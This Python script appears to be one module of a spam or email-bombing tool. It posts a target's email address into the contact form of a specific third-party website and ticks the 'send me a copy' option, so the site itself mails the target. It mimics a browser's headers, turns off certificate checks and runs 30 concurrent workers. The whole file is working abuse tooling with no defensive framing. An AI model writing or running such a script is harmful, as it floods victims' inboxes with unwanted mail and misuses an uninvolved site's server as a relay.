from os.path import basename

import requests

from module import Spam

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'http://www.5grand.com',
    'Referer': 'http://www.5grand.com/contact/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Your email was sent successfully. Thank you!'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'contact_name': target,
            'contact_email': target,
            'contact_subject': self.get_text(),
            'contact_message': self.get_text(),
            'contact_email_copy': '1',
            'submit': '1',
        }

        response = requests.post('http://www.5grand.com/contact/', headers=headers, data=data, verify=False)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(30)


if __name__ == '__main__':
    main()
